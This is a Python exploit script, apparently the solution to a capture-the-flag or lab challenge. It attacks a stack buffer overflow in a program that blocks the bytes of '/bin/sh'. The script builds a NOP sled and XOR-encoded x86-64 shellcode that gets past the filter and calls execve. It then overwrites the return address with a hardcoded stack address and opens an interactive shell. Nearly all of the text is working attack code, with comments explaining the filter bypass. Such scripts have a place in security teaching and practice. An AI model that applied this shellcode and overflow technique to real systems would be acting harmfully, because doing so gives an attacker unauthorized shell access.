import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()


'''
for (int i = 0; i < len; i++)
    {
        // Hackers seem to use these a lot hmm
        if (buffer[i] == 0x3b ||
                buffer[i] == '/' ||
                buffer[i] == 'b' ||
                buffer[i] == 'i' ||
                buffer[i] == 'n' ||
                buffer[i] == 's' ||
                buffer[i] == 'h')
            return 0;
    }
'''

'''
/bin/sh => 0x2f62696e2f7368
/bin/sh (little endian) => 0x68732f6e69622f
Add 0x90 (a space at the end) so it is 8 bytes
/bin/sh => 0x68732f2f6e69622f
/bin//sh

For the sys_execve:
push 0x3a ; puts in stack the 0x3a
pop rax ;  rax = 0x3a (rax is used to perform syscalls)
inc rax ; rax = 0x3a + 1 = 0x3b
'''

p.readuntil('Enter a')

pre_filed=b"mo00oooo00o0o... "
print(len(pre_filed))

jmp_address = p64(0x7fffffffed90)

'''
Banned chars:

[2f, 62 , 69, 6e, 2f, 73, 68]
'''

shellcode = b"\x48\x31\xF6\x56\x48\xBF\x99\x72\x92\x32\x19\x79\x41\x99\x49\xB9\xB6\x10\xFB\x5C\x36\x56\x32\xF1\x4C\x31\xCF\x57\x54\x5F\x6A\x3A\x58\x48\xFF\xC0\x0F\x05\x90\x90"
print(len(shellcode))

#p.sendline(b'A' * 111 + b'B' * 8 + b'C'*8)
payload = b'\x90' * (112- len(shellcode)-8) + shellcode + b'\x90' * 7 + b'A'*8 + jmp_address
print(len(payload))
p.sendline(payload)

p.interactive()